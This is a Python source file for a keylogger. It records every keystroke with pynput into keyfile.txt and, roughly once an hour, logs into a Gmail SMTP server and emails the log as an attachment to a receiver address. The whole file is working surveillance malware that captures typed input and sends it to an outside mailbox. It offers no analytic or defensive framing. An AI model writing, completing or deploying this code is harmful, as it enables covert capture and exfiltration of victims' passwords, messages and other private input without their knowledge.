import smtplib
import time
from pynput import keyboard
from email.mime.text import MIMEText 
from email.mime.application import MIMEApplication 
from email.mime.multipart import MIMEMultipart 
import os 

class Keylogger:

    def __init__(self):
        '''
        Starts initializer method
        '''
        self.caps = False

    def keyPressed(self, key):
        '''
        Tracks the keys pressed and writes them onto a text file
        It also keeps track of the time elapsed and sends an email if work has been done within the last hour
        '''

        # Makes the variable "current" global so it can be seen outside the function
        global current

        # Checks to see if an hour has elapsed
        if (time.perf_counter() - 3600) > current:

            # Changes variable 'current' the current time
            current = time.perf_counter()

            # Initialize connection to our gmail server
            smtp = smtplib.SMTP('smtp.gmail.com', 587) 
            smtp.ehlo() 
            smtp.starttls()

            # Sixteen digit password obtained from two step authentification set up
            email_password = 'sixteen digit password'

            email_sender = 'email address'
            email_receiver = 'email adress'

            # Login with your email and password 
            smtp.login(email_sender, email_password) 
            
            def message(subject="", attachment=None): 
                '''Builds the message and prepares it to be sent.'''
                
                # Builds message contents 
                msg = MIMEMultipart() 
                
                # Adds Subject 
                msg['Subject'] = subject
                    
                # Checks whether we have the lists of attachments or not! 
                if type(attachment) is not list: 
                    
                    # If it isn't a list, make it one 
                    attachment = [attachment]

                # Iterates through the attachment list
                for one_attachment in attachment: 
            
                    # Reads the attachment as binary data
                    with open(one_attachment, 'rb') as f: 
                            
                        # Reads the attachment using MIMEApplication 
                        file = MIMEApplication(f.read(), name=os.path.basename(one_attachment)) 
                    file['Content-Disposition'] = f'attachment;\filename="{os.path.basename(one_attachment)}"' 
                        
                    # At last, Add the attachment to our message object 
                    msg.attach(file) 
                return msg 
            
            
            # Calls the message function 
            msg = message("subject", "keyfile.txt") 
            
            # Makes a list of the email or emails to send to 
            to = [email_receiver] 
            
            # Provide some data to the sendmail function! 
            smtp.sendmail(from_addr=email_sender, to_addrs=to, msg=msg.as_string()) 
            
            # Closes the connection
            smtp.quit()

        # Creates the text file all keystrokes will be stored in
        with open("keyfile.txt", 'a') as logkey:

            # Tracks all letters and capitalization
            try:
                char = key.char
                print(str(key))

                # Activates if shift or caps lock is on
                if self.caps == True:
                    char = char.upper()
                logkey.write(char)
            
            # Activates if certain keys are pressed that normally fail with key.char
            except:

                if key == keyboard.Key.space:
                    logkey.write(' ')

                elif key == keyboard.Key.enter:
                    logkey.write('\n')

                elif key == keyboard.Key.backspace:
                    logkey.write('\b')

                # Checks if caps lock was already activated before code was run
                elif key == keyboard.Key.caps_lock:

                    if self.caps == False:
                        self.caps = True

                    else:
                        self.caps = False

# Starts the program
if __name__ == "__main__":

    # Creates variable "current" which stores the intial time of th efirst keystroke
    current = time.perf_counter()

    # Starts the code in class Keylogger
    logger = Keylogger()
    listener = keyboard.Listener(on_press = logger.keyPressed)
    listener.start()
    input()